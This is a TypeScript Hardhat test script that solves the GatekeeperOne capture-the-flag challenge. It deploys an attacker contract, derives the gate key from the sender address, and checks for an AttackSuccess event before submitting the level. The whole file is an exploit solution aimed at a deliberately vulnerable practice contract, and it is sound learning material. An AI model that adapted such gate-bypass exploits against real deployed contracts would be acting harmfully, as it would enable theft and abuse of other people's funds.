import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;
let solved = false;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`GatekeeperOne`);
  const challengeAddress = await createChallenge(
    `0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  const attackerFactory = await ethers.getContractFactory(`GatekeeperOneAttacker`);
  attacker = await attackerFactory.deploy(challenge.target);
  await attacker.waitForDeployment();
});

it("solves the challenge", async function () {
  // const gateKey = `0x1122334455667788`
  const address = await eoa.getAddress()
  const uint16TxOrigin = address.slice(-4)
  const gateKey = `0x100000000000${uint16TxOrigin}`
  console.log(`gateKey = ${gateKey}`)
  // _gateKey = 0x1122334455667788
  // uint32(uint64(_gateKey)) 0x55667788 = 1432778632
  // uint64(_gateKey) 0x1122334455667788 = 1234605616436508552
  // uint16(tx.origin) 0xD74C = 55116
  // tx.orign = 0x48490375809Cf5Af9D635C7860BD7F83f9f2D74c

  // use this to bruteforce gas usage

  const tx = await attacker.attack(gateKey, {
    gasLimit: 10000000n
  });
  const receipt = await tx.wait();

  let success = false;

  for (const log of receipt.logs) {
    try {
      const parsed = attacker.interface.parseLog(log);
      if (parsed && parsed.name === "AttackSuccess") {
        console.log("✅ Attack success!", parsed);
        console.log("gas offset:", parsed.args.gasOffset.toString());
        success = true;
      }
    } catch (e) {
      // Ignore logs that cannot be parsed as attacker contract events.
    }
  }

  if (!success) {
    console.log("❌ No AttackSuccess event found");
  }
  expect(success).to.be.true;
  solved = success;
});

after(async () => {
  if (!solved) return;
  expect(await submitLevel(challenge.target as string), "level not solved").to.be.true;
});
